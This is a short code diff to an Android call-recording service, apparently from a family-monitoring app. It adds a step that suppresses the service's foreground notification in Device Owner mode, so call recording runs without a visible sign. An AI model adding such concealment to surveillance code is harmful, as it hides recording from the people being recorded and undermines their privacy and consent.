@@ -106,6 +106,11 @@ class CallRecordService : Service() {
                 .build()
             
             startForeground(NOTIFICATION_ID, notification)
+            
+            // Suppress notification in Device Owner mode
+            com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
+                this, NOTIFICATION_ID
+            )
         } catch (e: Exception) {
             Log.e(TAG, "Failed to start foreground: ${e.message}")
             stopSelf()
